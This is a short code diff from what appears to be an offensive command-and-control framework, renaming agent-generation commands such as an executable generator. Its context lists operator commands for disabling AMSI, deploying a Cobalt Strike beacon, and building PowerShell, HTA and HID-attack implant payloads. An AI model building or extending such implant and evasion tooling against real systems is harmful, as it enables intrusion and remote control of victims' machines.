@@ -25,7 +25,7 @@ commands = {}
 key = "".join([random.choice(string.ascii_uppercase) for i in range(32)])
 aes_encryption_key = base64.b64encode(bytearray(key, "UTF-8")).decode()
 
-oct_commands = ["help", "exit", "interact", "list", "listeners", "listen_http", "listen_https", "delete", "generate_powershell", "generate_exe","generate_hta", "generate_digispark", "delete_listener"]
+oct_commands = ["help", "exit", "interact", "list", "listeners", "listen_http", "listen_https", "delete", "generate_powershell", "generate_unmanaged_exe","generate_hta", "generate_digispark", "delete_listener"]
 
 oct_commands_interact = ["load", "help", "exit", "back", "clear", "download", "load", "report", "disable_amsi", "modules", "deploy_cobalt_beacon"]
 
@@ -209,7 +209,7 @@ def generate_digispark(hostname, path, proto, output_path):
         print("[-] error while generating the file!")
 
 
-def generate_exe(hostname, path, proto, output_path):
+def generate_exe_powershell_downloader(hostname, path, proto, output_path):
 	if os.system("which mono-csc") == 0:
 		url = "{2}://{0}/{1}".format(hostname, path, proto)
 		ft = open("agents/octopus.cs")
@@ -239,7 +239,7 @@ def main_help_banner():
     print("listeners \t\t\tlist all listeners")
     print("* generate_powershell \t\tgenerate powershell oneliner")
     print("* generate_hta \t\t\tgenerate HTA Link")
-    print("* generate_exe \t\t\tgenerate executable agent")
+    print("* generate_unmanaged_exe \tgenerate unmanaged executable agent")
     print("* generate_digispark \t\tgenerate digispark file (HID Attack)")
     print("* listen_http  \t\t\tto start a HTTP listener")
     print("* listen_https  \t\tto start a HTTPS listener")
